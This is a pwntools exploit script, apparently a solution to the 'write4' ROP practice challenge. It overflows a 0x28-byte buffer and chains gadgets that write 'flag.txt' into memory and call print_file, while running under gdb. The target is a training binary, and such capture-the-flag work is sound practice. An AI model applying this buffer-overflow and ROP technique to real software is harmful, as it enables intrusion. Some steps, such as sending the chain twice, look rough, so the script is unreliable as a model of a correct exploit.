from pwn import *

# file information here

context.arch = 'x86_64'
executable = 'write4'
gdbinit = '''
    b *pwnme+151
    b *usefulGadgets
    c
'''

print(context.terminal)

elf = ELF(executable)
libc = elf.libc
rop = ROP([elf, libc])

p = process(elf.path)
gdb.attach(p, gdbscript=gdbinit)

# p.recvuntil("")

rop.raw(0x400690)
rop.raw(elf.sym['data_start'])
rop.raw('flag.txt')
rop.usefulGadgets()
rop.print_file(elf.sym['data_start'])

payload = flat(
    b'a' * 0x28,
    rop.chain()
)

info(rop.dump())

# pause()
p.send(payload)
p.send(rop.chain())

p.interactive()

# with open('out.txt', 'wb') as out:
    # out.write(payload)
